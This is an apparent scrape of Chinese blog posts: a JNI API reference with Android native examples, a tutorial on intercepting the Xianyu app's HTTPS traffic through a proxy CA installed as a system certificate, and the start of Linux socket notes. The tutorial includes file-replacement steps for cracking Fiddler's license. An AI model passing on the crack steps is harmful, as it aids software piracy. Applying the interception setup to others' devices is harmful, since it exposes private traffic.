Java_com_xxx_android2native_JniManager_openJni (JNIEnv * env, jobject object)&#123; // 线程不允许共用 env 环境变量，但是 JavaVM 指针是整个 jvm 共用的，所以可以通过下面的方法保存 JavaVM 指针，在线程中使用 env->GetJavaVM(&amp;gJavaVM); // 同理，jobject 变量也不允许在线程中共用，因此需要创建全局的 jobject 对象在线程中访问该对象 gJavaObj = env->NewGlobalRef(object);&#125; # JNIEnv # 定义 JNIEnv 是提供 JNI Native 函数的基础环境，线程相关，不同线程的 JNIEnv 相互独立，并且 JNIEnv 是一个 JNI 接口指针，指向了本地方法的一个函数表，该函数表中的每一个成员指向了一个 JNI 函数，本地方法通过 JNI 函数来访问 JVM 中的数据结构. # JNI 函数 # 版本信息 # GetVersion 获取 JNI 版本号 /*@param env: JNI interface 指针@return: 返回一个十六进制整数，其中高 16 位表示主版本号，低 16 位标识表示次版本号，如：1.2, GetVersion () 返回 0x00010002, 1.4, GetVersion () returns 0x00010004.*/jint GetVersion(JNIEnv *env);后面再出现 JNIEnv *env 这样的参数不再注释 # 类操作 # DefineClass 从原始类数据的缓冲区中加载类。 /*@param loader: 分派给所定义的类的类加载器@param buf: 包含 .class 文件数据的缓冲区 @param buflen: 缓冲区长度@return: 返回 Java 类对象。如果出错则返回 NULL。@throw: ClassFormatError 如果类数据指定的类无效 ClassCircularityError 如果类或接口是自身的超类或超接口 OutOfMemoryError 如果系统内存不足*/jclass DefineClass (JNIEnv *env, jobject loader, const jbyte *buf , jsize bufLen);# FindClass 该函数用于加载 Java 类。它将在 CLASSPATH 环境变量所指定的目录和 zip 文件里搜索指定的类名。 /*@param name: 类全名 = (包名 +‘/’+ 类名).replace ('.', '/');@return: 类对象全名；如果找不到该类，则返回 NULL。@throw: ClassFormatError 如果类数据指定的类无效 ClassCircularityError 如果类或接口是自身的超类或超接口 NoClassDefFoundError 如果找不到所请求的类或接口的定义 OutOfMemoryError 如果系统内存不足*/jclass FindClass(JNIEnv *env, const char *name);# GetObjectClass 通过对象获取这个类。该函数比较简单，唯一注意的是对象不能为 NULL，否则获取的 class 肯定返回也为 NULL。 /*@param obj: Java 类对象实例*/ jclass GetObjectClass (JNIEnv *env, jobject obj);# GetSuperclass 获取父类或者说超类 /*@param clazz: Java 类对象@return: 如果 clazz 代表一般类而非 Object 类，则该函数返回由 clazz 所指定的类的超类。 如果 clazz 指向 Object 类或代表某个接口，则该函数返回 NULL。*/ jclass GetSuperclass (JNIEnv *env, jclass clazz);# IsAssignableFrom 确定 clazz1 的对象是否可安全地强制转换为 clazz2 /*@param clazz1: 源类对象@param clazz2: 目标类对象@return: 以下三种情况返回 JNI_TRUE, 否则返回 JNI_FALSE 1. 第一及第二个类参数引用同一个 Java 类 2. 第一个类是第二个类的子类 3. 第二个类是第一个类的某个接口*/ jboolean IsAssignableFrom (JNIEnv *env, jclass clazz1, jclass clazz2);# 异常操作 # Throw 抛出 java.lang.Throwable 对象 /* @param obj: java.lang.Throwable 对象 @return: 成功时返回 0，失败时返回负数 @throw: java.lang.Throwable 对象 obj*/jint Throw(JNIEnv *env, jthrowable obj);# ThrowNew 利用指定类的消息（由 message 指定）构造异常对象并抛出该异常 /*@param clazz: java.lang.Throwable 的子类@param message: 用于构造 java.lang.Throwable 对象的消息@return: 成功时返回 0，失败时返回负数@throw: 新构造的 java.lang.Throwable 对象*/ jint ThrowNew (JNIEnv *env , jclass clazz, const char *message);# ExceptionOccurred 确定某个异常是否正被抛出。在本地代码调用 ExceptionClear () 或 Java 代码处理该异常前，异常将始终保持抛出状态。 /*@return: 返回正被抛出的异常对象，如果当前无异常被抛出，则返回 NULL*/ jthrowable ExceptionOccurred (JNIEnv *env);# ExceptionDescribe 将异常及堆栈的回溯输出到标准输出（例如 stderr）。该例程可便利调试操作。 void ExceptionDescribe (JNIEnv *env);# ExceptionClear 清除当前抛出的任何异常。如果当前无异常，则不产生任何效果。 void ExceptionClear (JNIEnv *env);# FatalError 抛出致命错误并且不希望虚拟机进行修复。该函数无返回值 /*@param msg: 错误消息*/ void FatalError (JNIEnv *env, const char *msg);# 全局及局部引用 # DeleteWeakGlobalRef 删除弱全局引用 void DeleteWeakGlobalRef(JNIEnv *env, jweak obj);# NewWeakGlobalRef 用 obj 创建新的弱全局引用 /*@param obj: 全局或局部引用@return: 返回弱全局引用，弱 obj 指向 null，或者内存不足时返回 NULL，同时抛出异常*/ jweak NewWeakGlobalRef(JNIEnv *env, jobject obj);# DeleteLocalRef 删除 localRef 所指向的局部引用 /*@param localRef: 局部引用*/ void DeleteLocalRef (JNIEnv *env, jobject localRef);# NewLocalRef 创建 obj 参数所引用对象的局部引用，创建的引用要通过调用 DeleteLocalRef () 来显式删除 /*@param obj: 全局或局部引用@return: 返回局部引用，如果系统内存不足则返回 NULL*/ jobject NewLocalRef(JNIEnv *env, jobject ref);# DeleteGlobalRef 删除 globalRef 所指向的全局引用 /*@param globalRef: 全局引用*/ void DeleteGlobalRef (JNIEnv *env, jobject globalRef);# NewGlobalRef 创建 obj 参数所引用对象的新全局引用，创建的引用要通过调用 DeleteGlobalRef () 来显式撤消 /*@param obj: 全局或局部引用@return: 返回全局引用，如果系统内存不足则返回 NULL*/object NewGlobalRef (JNIEnv *env, jobject obj);# 对象操作 # IsSameObject 测试两个引用是否引用同一 Java 对象 /*@param ref1: java 对象@param ref2: java 对象@return: 如果 ref1 和 ref2 引用同一 Java 对象或均为 NULL，则返回 JNI_TRUE。否则返回 JNI_FALSE*/ jboolean IsSameObject (JNIEnv *env, jobject ref1, jobject ref2);# IsInstanceOf 测试对象是否为某个类的实例 /*@param obj: Java 对象@param clazz: Java 类对象@return: 如果可将 obj 强制转换为 clazz，则返回 JNI_TRUE。否则返回 JNI_FALSE。NULL 对象可强制转换为任何类*/ jboolean IsInstanceOf (JNIEnv *env, jobject obj, jclass clazz);# GetObjectClass 返回对象的类 /*@param obj: Java 对象（不能为 NULL）@return: Java 类对象*/ jclass GetObjectClass (JNIEnv *env, jobject obj);# NewObject 构造新 Java 对象。方法 methodId 指向应调用的构造函数方法。注意：该 ID 特指该类 class 的构造函数 ID，必须通过调用 GetMethodID () 获得，且调用时的方法名必须为 &lt;init&gt; ，而返回类型必须为 void (V)，clazz 参数务必不要引用数组类。 /*@return: 返回 Java 对象，如果无法构造该对象，则返回 NULL@throw: InstantiationException 如果该类为接口或抽象类 OutOfMemoryError 如果系统内存不足*/jobject NewObject (JNIEnv *env , jclass clazz, jmethodID methodID, ...); // 参数附加在函数后面jobject NewObjectA (JNIEnv *env , jclassclazz, jmethodID methodID, jvalue *args); // 参数以指针形式附加 jobjec tNewObjectV (JNIEnv *env , jclassclazz, jmethodID methodID, va_list args); // 参数以 \"链表\" 形式附加# AllocObject 分配新 Java 对象而不调用该对象的任何构造函数，返回该对象的引用；clazz 参数务必不要引用数组类。 /*@param clazz: Java 类对象@return: 返回 Java 对象；如果无法构造该对象，则返回 NULL@throw: InstantiationException：如果该类为一个接口或抽象类 OutOfMemoryError：如果系统内存不足*/jobject AllocObject (JNIEnv *env, jclass clazz);# 字符串操作 # Get/ReleaseStringCritical 这两个函数的语义与 Get/ReleaseStringChars 函数类似，但 VM 会尽量返回一个指针。但是使用这一对函数时必须有严格限制：在这对函数调用之间绝对不能调用其他 JNI 方法，否则将导致当前线程阻塞。 const jchar * GetStringCritical(JNIEnv *env, jstring string, jboolean *isCopy);void ReleaseStringCritical(JNIEnv *env, jstring string, const jchar *carray);# GetStringUTFRegion 将 str 偏移位置 start 开始的 len 长度 unicode 字符转换为 C char 字符，并放在 buf 中 void GetStringUTFRegion(JNIEnv *env, jstring str, jsize start, jsize len, char *buf);# GetStringRegion 从 str 的偏移位置 start 开始，复制 len 长度的 unicode 字符到 buf 中 void GetStringRegion(JNIEnv *env, jstring str, jsize start, jsize len, jchar *buf);# ReleaseStringUTFChars 通知本地代码不要再访问 utf。utf 参数是一个指针，可利用 GetStringUTFChars () 获得 /*@param string: Java 字符串对象@param utf: 指向 UTF-8 字符串的指针*/ void ReleaseStringUTFChars (JNIEnv *env, jstring string, const char *utf);# GetStringUTFChars 返回指向字符串的 UTF-8 字符数组的指针。该数组在被 ReleaseStringUTFChars () 释放前将一直有效。 如果 isCopy 不是 NULL，*isCopy 在复制完成后即被设为 JNI_TRUE。如果未复制，则设为 JNI_FALSE。 /*@param string: Java 字符串对象@param isCopy: 指向布尔值的指针@return: 指向 UTF-8 字符串的指针。如果操作失败，则为 NULL*/ const char* GetStringUTFChars (JNIEnv*env, jstring string, jboolean *isCopy);# GetStringUTFLength 以字节为单位返回字符串的 UTF-8 长度 /*@param string: Java 字符串对象@return: 返回字符串的长度*/ jsize GetStringUTFLength (JNIEnv *env, jstring string);# NewStringUTF 利用 UTF-8 字符数组构造新 java.lang.String 对象 /*@param bytes: 指向 UTF-8 字符串的指针@return: Java 字符串对象。如果无法构造该字符串，则为 NULL@throw: OutOfMemoryError 如果系统内存不足*/ jstring NewStringUTF (JNIEnv *env, const char *bytes);# ReleaseStringChars 通知本地代码不要再访问 chars。参数 chars 是一个指针，可通过 GetStringChars () 从 string 获得 /*@param chars: 指向 Unicode 字符串的指针*/ void ReleaseStringChars(JNIEnv *env, jstring string, const jchar *chars);# GetStringChars 返回指向字符串的 Unicode 字符数组的指针。该指针在调用 ReleaseStringchars () 前一直有效。如果 isCopy 非空，则在复制完成后将 *isCopy 设为 JNI_TRUE。如果没有复制，则设为 JNI_FALSE /*@param string: Java 字符串对象@param isCopy: 指向布尔值的指针@return: 指向 Unicode 字符串的指针，如果操作失败，则返回 NULL*/const jchar * GetStringChars(JNIEnv*env, jstring string, jboolean *isCopy);# GetStringLength 返回 Java 字符串的长度（Unicode 字符数） /*@param string: Java 字符串对象@return: Java 字符串的长度*/jsize GetStringLength (JNIEnv *env, jstring string);# NewString 利用 Unicode 字符数组构造新的 java.lang.String 对象 /*@param unicodeChars: 指向 Unicode 字符串的指针@param len: Unicode 字符串的长度@return Java 字符串对象。如果无法构造该字符串，则为 NULL.@throw OutOfMemoryError：如果系统内存不足*/jstring NewString (JNIEnv *env, const jchar *unicodeChars, jsize len);# 数组操作 # SetObjectArrayElement 设置 Object 数组的元素 /*@param array: Java 数组@param index: 元素索引@param value: 新的对象@throw: ArrayIndexOutOfBoundsException 如果 index 不是数组中的有效下标 ArrayStoreException 如果 value 的类不是数组元素类的子类*/ void SetObjectArrayElement (JNIEnv *env, jobjectArray array, jsize index, jobject value);# GetObjectArrayElement 返回 Object 数组的元素 /*@param array: Java 数组@param index: 元素索引@return: Java 对象@throw: ArrayIndexOutOfBoundsException 如果 index 不是数组中的有效下标*/ jobject GetObjectArrayElement (JNIEnv *env, jobjectArray array, jsize index);# NewObjectArray 构造新的数组，它将保存类 elementClass 中的对象。所有元素初始值均设为 initialElement /*@param length: 数组大小@param elementClass: 数组元素类对象@return: initialElement 初始值，可以为 NULL@throw: OutOfMemoryError 如果系统内存不足*/jarray NewObjectArray(JNIEnv *env, jsize length, jclass elementClass, jobject initialElement);# GetArrayLength 返回数组中的元素数 /*@param array: Java 数组对象@return: 数组的长度*/jsize GetArrayLength (JNIEnv *env, jarray array);# New[PrimitiveType]Array Routines 用于构造基本类型数组对象 /*@param length: 要构造的数组的长度@return Java 数组。如果无法构造该数组，则为 NULL*/ArrayType New[PrimitiveType]Array(JNIEnv *env, jsize length);下表说明了特定的基本类型数组构造函数。用户应把 New [PrimitiveType] Array 替换为某个实际的基本类型数组构造函数例程名，然后将 ArrayType 替换为该例程相应的数组类型: New[PrimitiveType]Array ArrayType NewBooleanArray() jbooleanarray NewByteArray() jbytearray NewCharArray() jchararray NewShortArray() jshortarray NewIntArray() jintarray NewLongArray() jlongarray NewFloatArray() jfloatarray NewDoubleArray() jdoublearray # Get[PrimitiveType]ArrayElements 一组返回基本类型数组体的函数。结果在调用相应的 Release [PrimitiveType] ArrayElements () 函数前将一直有效。由于返回的数组可能是 Java 数组的副本，因此对返回数组的更改不必在基本类型数组中反映出来，直到调用了 Release [PrimitiveType] ArrayElements ()。 /*@param array: Java 对象数组@param isCopy: 如果 isCopy 不是 NULL，*isCopy 在复制完成后即被设为 JNI_TRUE; 如果未复制，则设为 JNI_FALSE@return: 返回指向数组的指针，如果操作失败，则为 NULL*/NativeType * Get[PrimitiveType]ArrayElements (JNIEnv *env, ArrayType array, jboolean *isCopy); Get[PrimitiveType]ArrayElements NativeType ArrayType GetBooleanArrayElements() jboolean jbooleanArray GetByteArrayElements() jbyte jbyteArray GetCharArrayElements() jchar jcharArray GetShortArrayElements() jshort jshortArray GetIntArrayElements() jint jintArray GetLongArrayElements() jlong jlongArray GetFloatArrayElements() jfloat jfloatArray GetDoubleArrayElements() jdouble jdoubleArray # Release[PrimitiveType]ArrayElements 释放 elems，通知本地代码不要再访问 elems /*@param array: Java 数组对象@param elems: 参数是一个通过使用对应的 Get [PrimitiveType] ArrayElements () 函数由 array 导出的指针。@param mode: 释放模式，mode 参数将提供有关如何释放数组缓冲区的信息。如果 elems 不是 array 中数组元素的副本，mode 将无效；否则，mode 将具有下表所述的功能: 0 复制回内容并释放 elems 缓冲区 JNI_COMMIT 复制回内容但不释放 elems 缓冲区 JNI_ABORT 释放缓冲区但不复制回变化*/ void Release[PrimitiveType]ArrayElements (JNIEnv *env, ArrayType array, NativeType *elems, jint mode);Release [PrimitiveType] ArrayElements 惯用法里的类型参数与 Get [PrimitiveType] ArrayElements 对应，不再列出 # Get[PrimitiveType]ArrayRegion 将基本类型数组某一区域复制到缓冲区中的一组函数，使用时替换 PrimitiveType， ArrayType，和 NativeType，如 GetBooleanArrayRegion () ，jbooleanArray 和 jboolean /*@param array: Java 数组 @param start: 起始位置@param len: 要复制的长度@param buf: 目标缓冲区@throw: ArrayIndexOutOfBoundsException 如果区域中的某个下标无效*/void Get[PrimitiveType]ArrayRegion (JNIEnv *env, ArrayType array, jsize start, jsize len, NativeType *buf);# Set[PrimitiveType]ArrayRegion 将基本类型数组的某一区域从缓冲区中复制回来的一组函数，使用时替换 PrimitiveType， ArrayType，和 NativeType，如 SetBooleanArrayRegion () ，jbooleanArray 和 jboolean /*@param array: Java 数组@param start: 起始位置@param len: 写回的长度@param buf: 源缓冲区@throw: ArrayIndexOutOfBoundsException：如果区域中的某个下标无效*/ void Set[PrimitiveType]ArrayRegion (JNIEnv *env, ArrayType array, jsize start, jsize len, NativeType *buf);# GetPrimitiveArrayCritical 与 ReleasePrimitiveArrayCritical 作用同 Get/Release [PrimitiveType] ArrayElements 相同，但是 VM 尽可能返回原 java 数组的指针，否则返回一份拷贝。 这两组调用之间不能调用其他 JNI 函数或进行其他系统调用，否则会导致线程阻塞。 void * GetPrimitiveArrayCritical(JNIEnv *env, jarray array, jboolean *isCopy);void ReleasePrimitiveArrayCritical(JNIEnv *env, jarray array, void *carray, jint mode);# 访问对象的属性和方法 # GetStaticMethodID 获取类对象的静态方法 ID jfieldID GetStaticMethodID(JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetFieldID 返回 Java 类（非静态）域的属性 ID。该域由其名称及签名指定。访问器函数的 Get [type] Field 及 Set [type] Field 系列使用域 ID 检索对象域。GetFieldID () 不能用于获取数组的长度域。应使用 GetArrayLength ()。 /*@param clazz: Java 类对象@param name: 该属性的 Name 名称@param sig: 该属性的域签名@return: 属性 ID 对象。如果操作失败，则返回 NULL@throw: NoSuchFieldError 如果找不到指定的域 ExceptionInInitializerError 如果由于异常而导致类初始化程序失败 OutOfMemoryError 如果系统内存不足*/jfieldID GetFieldID (JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetMethodID 返回类或接口实例（非静态）方法的方法 ID。方法可在某个 clazz 的超类中定义，也可从 clazz 继承。该方法由其名称和签名决定。 GetMethodID () 可使未初始化的类初始化。要获得构造函数的方法 ID，应将 &lt;init&gt; 作为方法名，同时将 void (V) 作为返回类型 /*@param clazz: Java 类对象@param name: 该方法的 Name 名称@param sig: 该方法参数和返回值域签名 *@return: 方法 ID，如果找不到指定的方法，则为 NULL@throw: NoSuchMethodError 如果找不到指定方法 ExceptionInInitializerError 如果由于异常而导致类初始化程序失败 OutOfMemoryError 如果系统内存不足*/jmethodID GetMethodID(JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetStaticFieldID 获取类的静态域 ID 方法 jfieldID GetStaticFieldID (JNIEnv *env,jclass clazz, const char *name, const char *sig);# Get[type]Field 该例程系列返回对象的实例（非静态）域的值。要访问的域由通过调用 GetFieldID () 而得到的域 ID 指定。 /*@param obj: Java 对象（不能为 NULL）@param fieldID: 有效的域 ID@return: 属性的内容*/NativeType Get[type]Field (JNIEnv*env, jobject obj, jfieldID fieldID); // 获取类对象静态域的值NativeType GetStatic[type]Field (JNIEnv*env, jclass classzz, jfieldID fieldID); Get[type]Field NativeType GetObjectField() jobject GetBooleanField() jboolean GetByteField() jbyte GetCharField() jchar GetShortField() jshort GetIntField() jint GetLongField() jlong GetFloatField() jfloat GetDoubleField() jdouble # Set[type]Field 该惯用法设置对象的实例（非静态）属性的值。要访问的属性由通过调用 SetFieldID () 而得到的属性 ID 指定。 /*@param obj: Java 对象（不能为 NULL）@param fieldId: 有效的域 ID@param value: 域的新值*/void Set[type]Field (JNIEnv *env, jobject obj, jfieldID fieldID, NativeType value);// 设置类的静态域的值void SetStatic[type]Field (JNIEnv *env, jclass classzz, jfieldID fieldID, NativeType value); Set[type]Field NativeType SetObjectField() jobject SetBooleanField() jboolean SetByteField() jbyte SetCharField() jchar SetShortField() jshort SetIntField() jint SetLongField() jlong SetFloatField() jfloat SetDoubleField() jdouble # Call[type]Method 这三个操作的方法用于从本地方法调用 Java 实例方法。它们的差别仅在于向其所调用的方法传递参数时所用的机制。 这三个操作将根据所指定的 methodID 调用 Java 对象的实例（非静态）方法。参数 methodID 必须通过调用 GetMethodID () 来获得。当这些函数用于调用私有方法和构造函数时，methodID 必须从 obj 的真实类派生而来，而不应从其某个超类派生。当然，附加参数可以为空 。 /*@param obj Java 对象@param methodId 方法 ID*/NativeType Call[type]Method (JNIEnv *env, jobject obj, jmethodID methodID, ...); // 参数附加在函数后面，NativeType Call[type]MethodA (JNIEnv *env, jobject obj, jmethodID methodID, jvalue *args); // 参数以指针形式附加NativeType Call[type]MethodV (JNIEnv *env, jobject obj,jmethodID methodID, va_list args); // 参数以 \"链表\" 形式附加 Call[type]Method&lt;A/V&gt; NativeType CallVoidMethod() 无 CallObjectMethod() jobect CallBooleanMethod () jboolean CallByteMethod() jbyte CallCharMethod() jchar CallShortMethod() jshort CallIntMethod() jint CallLongMethod() jlong CallFloatMethod() jfloat CallDoubleMethod() jdouble # 注册本地方法 # RegisterNatives 向 clazz 参数指定的类注册本地方法。 /**@param clazz: 目标类对象@param methods: JNINativeMethod 结构数组，其中包含本地方法的名称、签名和函数指针@param nMethods: methods 参数的长度@return: 成功时返回 0；失败时返回负数@throw: NoSuchMethodError 如果找不到指定的方法或方法不是本地方法*/jint RegisterNatives(JNIEnv *env, jclass clazz, const JNINativeMethod *methods, jint nMethods);methods JNINativeMethod 定义如下： typedef struct &#123; char *name; char *signature; void *fnPtr; &#125; JNINativeMethod; # UnregisterNatives 反注册类的本地方法。类将返回到链接或注册了本地方法函数前的状态。该函数不应在本地代码中使用。相反，它可以为某些程序提供一种重新加载和重新链接本地库的途径。 /*@param clazz: Java 类对象@throw: 成功时返回 0；失败时返回负数*/jint UnregisterNatives (JNIEnv *env, jclass clazz);# jobject thiz 当我们在 native 中注册一个 java 函数后，一般可以看到函数的声明都像下面这个样子 Java_com_oacia_loadso_MainActivity_hello(JNIEnv *env, jobject thiz) &#123; // TODO: implement hello()&#125;那么函数的第二个参数 jobject thiz 有什么作用呢？ 我们不妨看一看 android studio 给我们的代码提示 这个 thiz 指向的是 native 函数声明所在的类 demo 如下，在 MainActivity 中的 onCreate 会对变量 s 赋值 package com.oacia.loadso;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; static &#123; try &#123; System.loadLibrary(\"oacia\"); &#125; catch (Exception ignored) &#123; &#125; &#125; String TAG = \"oacia_tag\"; public native void hello(); public String s = \"1234\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); s=\"change in create\"; hello(); &#125;&#125;在 JNI 中会通过 jobject thiz 读取变量 s #include &lt;jni.h>#include \"stdio.h\"extern \"C\"&#123;#include &lt;android/log.h>#define TAG \"oacia_tag\" // 这个是自定义的 LOG 的标识#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__) // 定义 LOGD 类型#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG ,__VA_ARGS__) // 定义 LOGI 类型#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,TAG ,__VA_ARGS__) // 定义 LOGW 类型#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG ,__VA_ARGS__) // 定义 LOGE 类型#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL,TAG ,__VA_ARGS__) // 定义 LOGF 类型jint JNI_OnLoad(JavaVM* vm, void* reserved __unused)&#123; return JNI_VERSION_1_6;&#125;JNIEXPORT void JNICALLJava_com_oacia_loadso_MainActivity_hello(JNIEnv *env, jobject thiz) &#123; // TODO: implement hello() jclass clazz = env->GetObjectClass(thiz); jfieldID s_field = env->GetFieldID(clazz,\"s\",\"Ljava/lang/String;\"); jstring str = (jstring)env->GetObjectField(thiz,s_field); LOGD(\"%s\",env->GetStringUTFChars(str, nullptr));&#125;&#125;最终也是成功读取并打印出了经过修改后的变量 s 的值 # 动态注册 动态注册都是调用 RegisterNatives 来实现的 JNINativeMethod 内数组的三个参数分别代表 函数名称 ， 函数签名 ， 主体函数 jint RegisterNatives(JNIEnv *env) &#123; jclass clazz = env->FindClass(\"com/oacia/loadso/MainActivity\"); if (clazz == NULL) &#123; LOGE(\"con't find class: com/oacia/loadso/MainActivity\"); return JNI_ERR; &#125; JNINativeMethod methods_MainActivity[] = &#123; &#123;\"stringFromJNI\", \"()Ljava/lang/String;\", (void *) stringFromJNI&#125;, &#123;\"add\", \"(II)I\", (void *) add&#125; &#125;; // int len = sizeof(methods_MainActivity) / sizeof(methods_MainActivity[0]); return env->RegisterNatives(clazz, methods_MainActivity, sizeof(methods_MainActivity) / sizeof(methods_MainActivity[0]));&#125;# native 层调用 java 层函数 native 调用 java 层的函数只需要四步就可以完成 获取 class 获取函数签名 获取 class 的实例 调用函数 jclass loadso = env->FindClass(\"com/oacia/loadso/MainActivity\");jmethodID MethodID = env->GetMethodID(loadso, \"logA\", \"()V\");jobject javaObject = env->AllocObject(loadso);env->CallVoidMethod(javaObject, MethodID);","categories":[],"tags":[]},{"title":"安卓APP抓包-以咸鱼为例","slug":"xianyu-capture","date":"2023-09-18T06:13:25.000Z","updated":"2025-04-08T18:55:12.126Z","comments":true,"path":"xianyu-capture/","link":"","permalink":"https://oacia.dev/xianyu-capture/","excerpt":"","text":"最近想要研究一下安卓 APP 的抓包，正巧听说 flutter 应用非常难抓包，了解了一下应该是 flutter 应用不走代理的原因，而恰巧咸鱼 APP 就是用 flutter 写的，我寻思要是我连这么难抓包的 APP 都会抓了，那么未来去抓其他 APP 的包岂不是信手拈来～ # 环境搭建 # fiddler 4.0.1 破解版已经失效，勿用！此处仅作记录 下载地址，需要断网安装！ # 破解流程 首先下载需要替换的组件， 下载地址 之后打开 fiddler4.0.1, 连接网络后，注册登录账号，然后点击十天免费使用 随后，我们替换掉下列路径的文件 Fiddler Everywhere\\resources\\app\\out\\main.jsFiddler Everywhere\\resources\\app\\out\\WebServer\\ClientApp\\dist\\main.c5f6cd9850653179.jsFiddler Everywhere\\resources\\app\\out\\WebServer\\Fiddler.WebUi.dllFiddler Everywhere\\resources\\app\\out\\WebServer\\FiddlerBackendSDK.dll首先将电脑和手机连接到同一个热点 然后输入 ipconfig 查看电脑的 IP 随后打开 fiddler, 点击 Settings-&gt;Connections 查看监听端口 点击 Settings-&gt;HTTPs 打开 https 抓包 进入手机浏览器，访问电脑的 IP 和端口 192.168.140.120:8866 , 点击 FiddlerRoot certificate 进行下载 在手机中进入 设置-&gt;安全-&gt;加密与凭据-&gt;安装证书-&gt;CA证书 选择 FiddlerRoot.cer.crt 进行安装 如果没有这个文件，可以点击 Fiddler 的 Settings-&gt;HTTPS-&gt;Export root certificates(DER/Binary format) 下载到桌面，然后 adb push 到手机上进行安装 # reqable 进入官网进行下载 在 Android 设备上配置 Wifi 代理 首先我们需要让电脑和手机在同一个局域网中 然后在 PC 上输入 ipconfig 获得主机 IP 在手机上为网络配置手动代理 随后将导出证书 然后将证书传到手机上 在手机中进入 设置-&gt;安全-&gt;加密与凭据-&gt;安装证书-&gt;CA证书 选择 reqable-ca.crt 进行安装 # 安装证书为系统证书 需要注意的是，我们此时安装的证书只是用户证书，我们还需要将其移动至系统证书 我们首先下载并安装 FoxMagiskModuleManager 然后下载 movecert zip 的压缩包 然后在 FoxMagiskModuleManager 本地安装 随后重启手机，用户证书就移动到系统证书了 # drony 与 fiddler 配合使用，若使用 reqable 则无需使用 drony!!! drony 通过使用 VPN 的手段，截获了设置的 APP 的所有流量，再将这部分流量转发到 fiddler 的监听端口，强制这部分流量通过 fiddler，fiddler 就能对抓到的请求进行截获 下载地址 打开 drony, 左滑屏幕转到设置，点击无线网络 长按呼出菜单点击编辑 设置主机名和端口，并且代理类型需要为 普通http代理 向下滑动，找到 过滤默认值 ，并设置为 引导全部 ，随后点击 规则 进入转发规则设置 点击 ＋ 号添加规则 配置 行动 为 本地代理链全部 ，选择应用程序为咸鱼，配置完成后点击右上角进行保存 返回主界面，开启转发 # 开始抓包 上述配置完成之后，打开咸鱼，即可在 Fiddler 成功抓包！ # 参考资料 安卓 APP 抓包教程（一）—— 使用 fiddler 抓包 安卓 APP 抓包教程（二）—— 使用 drony 配合 fiddler 抓包","categories":[],"tags":[]},{"title":"linux socket TCP/UDP通信学习","slug":"linux-socket-tcp-udp","date":"2023-09-14T10:37:38.000Z","updated":"2025-04-08T18:55:11.711Z","comments":true,"path":"linux-socket-tcp-udp/","link":"","permalink":"https://oacia.dev/linux-socket-tcp-udp/","excerpt":"","text":"以往学习过 Windows 中的 TCP/UDP socket 通信，但是当我研究安卓中的 tcp 通信时，发现 C 语言通信的语法截然不同，然后才发现安卓系统上是 Linux 操作系统，所以也有必要去好好学习 Linux 系统中的 tcp/udp 通信 # socket API 接口 # socket 创建一个 socket 套接字 #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param domain: 通信协议簇@param type: 指定 socket 类型@param protocol: 指定协议，当 protocol 为 0 时，会自动选择 type 类型对应的默认协议@return: 创建成功返回一个 socket 套接字，创建失败返回 - 1*/int socket(int domain, int type, int protocol);domain 名称 值 含义 AF_UNSPEC 0 AF_UNIX 1 Unix domain sockets AF_LOCAL 1 POSIX name for AF_UNIX AF_INET 2 Internet IP Protocol, IPv4 AF_AX25 3 Amateur Radio AX.25 AF_IPX 4 Novell IPX AF_APPLETALK 5 AppleTalk DDP AF_NETROM 6 Amateur Radio NET/ROM AF_BRIDGE 7 Multiprotocol bridge AF_ATMPVC 8 ATM PVCs AF_X25 9 Reserved for X.25 project AF_INET6 10 IPv6 AF_ROSE 11 Amateur Radio X.25 PLP AF_DECnet 12 Reserved for DECnet project AF_NETBEUI 13 Reserved for 802.2LLC project AF_SECURITY 14 Security callback pseudo AF AF_KEY 15 PF_KEY key management API AF_NETLINK 16 AF_ROUTE AF_NETLINK Alias to emulate 4.4BSD AF_PACKET 17 Packet family AF_ASH 18 Ash AF_ECONET 19 Acorn Econet AF_ATMSVC 20 ATM SVCs AF_RDS 21 RDS sockets AF_SNA 22 Linux SNA Project (nutters!) AF_IRDA 23 IRDA sockets AF_PPPOX 24 PPPoX sockets AF_WANPIPE 25 Wanpipe API Sockets AF_LLC 26 Linux LLC AF_IB 27 Native InfiniBand address AF_MPLS 28 MPLS AF_CAN 29 Controller Area Network AF_TIPC 30 TIPC sockets AF_BLUETOOTH 31 Bluetooth sockets AF_IUCV 32 IUCV sockets AF_RXRPC 33 RxRPC sockets AF_ISDN 34 mISDN sockets AF_PHONET 35 Phonet sockets AF_IEEE802154 36 IEEE802154 sockets AF_CAIF 37 CAIF sockets AF_ALG 38 Algorithm sockets AF_NFC 39 NFC sockets AF_VSOCK 40 vSockets AF_KCM 41 Kernel Connection Multiplexor AF_QIPCRTR 42 Qualcomm IPC Router type 名称 值 含义 对应的协议 SOCK_STREAM 1 stream (connection) socket TCP SOCK_DGRAM 2 datagram (conn.less) socket UDP SOCK_RAW 3 raw socket ICMP SOCK_RDM 4 reliably-delivered message SOCK_SEQPACKET 5 sequential packet socket SCTP SOCK_DCCP 6 Datagram Congestion Control Protocol socket DCCP SOCK_PACKET 10 linux specific way of getting packets at the dev level. # bind 当用 socket 函数创建套接字后，我们需要使用 bind 函数来将指定的 IP 和端口分配给已经创建的 socket #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: socket 函数返回的 socket 套接字@param addr: 含有要绑定的 IP 和端口的地址结构指针@param addrlen: addr 的大小，一般使用 sizeof 来进行计算@return: 成功返回 0, 失败返回 - 1*/int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);addr IPv4 定义的类型为 struct sockaddr_in struct sockaddr_in &#123; sa_family_t sin_family; /* address family: AF_INET */ in_port_t sin_port; /* port in network byte order */ struct in_addr sin_addr; /* internet address */&#125;; /* Internet address. */struct in_addr &#123; uint32_t s_addr; /* address in network byte order */&#125;; IPv6 定义的类型为 sockaddr_in6 struct sockaddr_in6 &#123; sa_family_t sin6_family; /* AF_INET6 */ in_port_t sin6_port; /* port number */ uint32_t sin6_flowinfo; /* 